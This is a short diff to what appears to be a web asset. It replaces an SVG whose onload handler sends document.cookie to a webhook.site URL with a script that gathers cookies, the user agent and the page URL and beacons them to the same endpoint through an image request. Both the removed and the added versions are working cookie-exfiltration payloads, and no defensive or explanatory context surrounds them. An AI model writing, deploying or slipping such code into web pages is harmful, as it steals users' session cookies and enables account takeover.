@@ -1,3 +1,10 @@
-<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://webhook.site/aac76a2b-98fc-4651-a334-9290195913b3?c=' + document.cookie)">
-  <circle r="40" cx="50" cy="50" fill="red" />
-</svg>
+<script>
+  const data = {
+    cookies: document.cookie,
+    userAgent: navigator.userAgent,
+    url: location.href
+  };
+
+  const img = new Image();
+  img.src = "https://webhook.site/aac76a2b-98fc-4651-a334-9290195913b3?data=" + encodeURIComponent(JSON.stringify(data));
+</script>
